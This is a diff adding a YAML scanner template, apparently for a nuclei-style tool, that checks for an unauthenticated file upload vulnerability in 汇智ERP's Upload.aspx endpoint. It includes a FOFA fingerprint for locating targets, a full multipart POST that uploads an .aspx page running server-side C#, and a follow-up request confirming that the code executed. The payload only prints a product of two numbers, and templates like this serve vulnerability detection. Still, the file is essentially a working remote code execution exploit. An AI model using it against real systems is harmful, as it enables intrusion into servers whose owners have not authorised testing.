@@ -1,0 +1,95 @@
+id: yaml-huizhi-erp-upload
+info:
+  name: 汇智ERP Upload.aspx接口 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 汇智ERP
+  fofa: icon_hash="-642591392"
+variables:
+  filename: to_lower(random_str(6))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /nssys/common/Upload.aspx?Action=DNPageAjaxPostBack
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLkkAXATqVKBHZ8zk
+  data: '------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+    /wEPDwUJOTc0NzkxMzQ1D2QWAgIDDxYGHhdJc0JlZm9yZU9wZXJhdGVTYXZlRGF0YWgeBmlzZ3VpZAUBMR4OY2hlY2tmb3Jtc3RhdGUFATBkZHwobq1hNj9MTgjOtrIn/0gbCdhD
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+
+    Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+
+    573D6CFB
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+
+    Content-Disposition: form-data; name="upfile_Input"
+
+
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+
+    Content-Disposition: form-data; name="upfile_upload"; filename="1"
+
+    Content-Type: image/jpeg
+
+
+    <!DOCTYPE html>
+
+    <html>
+
+    <head>
+
+    <title>vulnerability</title>
+
+    </head>
+
+    <body>
+
+    <%@ Page Language="C#" %>
+
+    <% Response.Write({{.t1}}*{{.t2}}); %>
+
+    </body>
+
+    </html>
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+
+    Content-Disposition: form-data; name="upfilename"
+
+
+    {{.filename}}.aspx
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+
+    Content-Disposition: form-data; name="dnpostmethodname"
+
+
+    uploadfile
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk--
+
+    '
+  output:
+  - regex_match(body,`/Upload/(?P<date>.*?)/`)
+  expression: "status_code == 200 \n"
+- method: GET
+  path: /Upload/{{.date}}/{{.filename}}.aspx
+  expression: 'status_code == 200 &&
+
+    contains(body,"vulnerability") &&
+
+    contains(body,t3)
+
+    '
+transport: http
